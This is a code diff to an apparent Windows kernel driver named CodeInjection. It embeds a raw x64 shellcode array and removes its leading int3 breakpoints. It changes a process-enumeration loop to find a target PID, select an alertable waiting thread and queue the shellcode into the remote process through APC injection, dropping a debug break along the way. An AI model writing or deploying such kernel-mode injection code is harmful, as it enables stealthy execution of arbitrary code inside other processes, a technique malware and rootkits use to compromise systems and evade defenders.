@@ -6,7 +6,7 @@
 
 namespace CodeInjection {
 
-	char shellcode[] = "\xCC\xCC\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
+	char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
 		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
 		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
 		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
@@ -125,12 +125,9 @@ namespace CodeInjection {
 
 		do {
 			//DbgPrint("\t[*] PID : %p\n", static_cast<PVOID>(SystemInformation->UniqueProcessId));
-			//DbgPrint("\t[*] ImageName : %wZ\n", &SystemInformation->ImageName);
-			//if (SystemInformation->UniqueProcessId == reinterpret_cast<HANDLE>(pid)) {
-			if (RtlCompareUnicodeString(&SystemInformation->ImageName, &usString, FALSE) == 0) {
-				DbgPrint("[+] Got matching name\n");
-				break;
-				/*for (ULONG idx = 0; idx < SystemInformation->NumberOfThreads; idx++) {
+			if (SystemInformation->UniqueProcessId == reinterpret_cast<HANDLE>(pid)) {
+				DbgPrint("[+] Got matching PID \n");
+				for (ULONG idx = 0; idx < SystemInformation->NumberOfThreads; idx++) {
 					auto threads = &SystemInformation->Threads[idx];
 					if (threads->State == StateWait) {
 						DbgPrint("[+] Got state wait.\n");
@@ -141,7 +138,6 @@ namespace CodeInjection {
 							DbgPrint("[+] ThreadId(%p) with Ethread : %llx\n", threadId, reinterpret_cast<uintptr_t>(ThreadObject));
 							if (ThreadObject->Alertable) {
 								DbgPrint("[+] Alertable \n");
-								//__debugbreak();
 								ns = PerformApcInjection(ThreadObject, RemoteProcessBase);
 								if (NT_SUCCESS(ns)) {
 									ZwWaitForSingleObject(ThreadObject, TRUE, nullptr);
@@ -154,7 +150,7 @@ namespace CodeInjection {
 						continue;
 					}
 					continue;
-				}*/
+				}
 			}	
 
 			SystemInformation = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>
